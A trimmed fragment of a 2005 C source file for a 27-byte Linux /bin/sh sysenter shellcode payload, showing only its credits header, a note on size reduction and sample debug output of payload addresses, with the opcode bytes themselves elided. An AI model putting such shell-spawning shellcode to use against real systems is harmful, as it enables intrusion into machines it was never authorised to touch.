/*
 lnx_binsh3.c - v1 - 27 Byte /bin/sh sysenter Opcode Array Payload
 Copyright(c) 2005 c0ntex <c0ntex@open-security.org>
 Copyright(c) 2005 amnesia <amnesia@anomalistic.org>
...
which does make the shellcode slightly larger  :/
 ...
 [-] Stack Pointer found -> [0xbffff648]
         [-] Size of payload egg -> [27]
	 [-] Payload Begin -> [0x804968c]
	 [-] Payload End   -> [0x80496b9]
...
/* reduced shellcode size from 45 to 27 - amnesia */
